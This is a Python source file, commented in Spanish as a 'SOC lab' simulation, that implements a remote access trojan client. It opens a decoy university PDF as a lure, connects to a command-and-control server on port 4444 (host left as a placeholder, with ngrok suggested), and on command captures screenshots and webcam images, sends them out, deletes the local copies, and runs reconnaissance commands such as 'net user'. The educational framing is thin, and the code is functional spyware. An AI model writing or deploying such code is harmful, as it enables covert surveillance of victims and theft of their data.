import socket
import subprocess
import os
import pyautogui
import cv2
import webbrowser
import time

# === [SOC LAB] CONFIGURACIÓN DE RED ===
# Se utiliza un placeholder para evitar el uso indebido del código.
# En un entorno real, aquí iría el endpoint de ngrok (ej. '0.tcp.eu.ngrok.io')
IP_SERVIDOR = 'REDACTED_ENDPOINT' 
PUERTO = 4444 # Puerto estándar de simulación
# ======================================

def enviar_fichero(cliente, nombre_archivo):
    """Función para la exfiltración controlada de archivos de telemetría."""
    if os.path.exists(nombre_archivo):
        tamano = os.path.getsize(nombre_archivo)
        cliente.send(str(tamano).encode('latin-1'))
        time.sleep(1) 
        with open(nombre_archivo, "rb") as f:
            cliente.sendall(f.read())
        os.remove(nombre_archivo) 
    else:
        cliente.send(b"ERROR")

def iniciar_agente():
    """
    Simulación de agente de acceso remoto para análisis de IoCs.
    Abre un documento señuelo para estudiar técnicas de distracción.
    """
    # Lure Document: Simulación de Phishing Educativo
    webbrowser.open("https://www.uah.es/export/sites/uah/es/conoce-la-uah/.methods/pdf/UAH-en-cifras-ESP.pdf")
    
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Intento de conexión al servidor C2 bajo estudio
        cliente.connect((IP_SERVIDOR, PUERTO))
    except Exception as e:
        print(f"[-] Error de conexión: {e}")
        return

    while True:
        try:
            comando = cliente.recv(1024).decode('latin-1')
            if comando.lower() == 'exit': break
            
            # Módulo de análisis visual (Captura de pantalla)
            if comando.lower() == 'screenshot':
                pyautogui.screenshot().save("snap.png")
                enviar_fichero(cliente, "snap.png")
            
            # Módulo de acceso a periféricos (Webcam)
            elif comando.lower() == 'cam':
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                if ret:
                    cv2.imwrite("foto.jpg", frame)
                    cap.release()
                    enviar_fichero(cliente, "foto.jpg")
                else:
                    cliente.send(b"ERROR")
            
            # Ejecución limitada de comandos para auditoría técnica
            elif comando.lower() in ['whoami', 'hostname', 'net user']:
                proc = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                res = proc.stdout.read() + proc.stderr.read()
                cliente.send(res if res else b"[+] Ejecutado")
            else:
                cliente.send(b"[SEC-POLICY] Comando restringido por el laboratorio.")
        except:
            break
    cliente.close()

if __name__ == "__main__":
    iniciar_agente()